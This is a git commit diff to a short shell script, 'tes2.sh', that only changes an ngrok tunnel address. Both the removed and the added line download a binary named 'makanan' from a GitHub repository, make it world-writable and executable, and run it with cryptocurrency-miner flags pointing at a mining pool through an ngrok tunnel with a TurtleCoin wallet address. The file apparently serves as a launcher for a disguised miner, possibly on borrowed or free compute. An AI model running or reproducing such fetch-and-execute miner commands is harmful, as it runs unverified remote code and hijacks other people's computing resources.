e446e5070f40233b4303a9f07927962619f530b1
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-03-05 16:59:07 +0900

    Update tes2.sh

--- tes2.sh
+++ tes2.sh
@@ -1,2 +1,2 @@
 lscpu
-wget https://github.com/raufpermana22/tesami/raw/main/makanan && chmod 777 makanan && ./makanan --donate-level 1 -o 8.tcp.ngrok.io:11569 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
+wget https://github.com/raufpermana22/tesami/raw/main/makanan && chmod 777 makanan && ./makanan --donate-level 1 -o 2.tcp.ngrok.io:16774 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
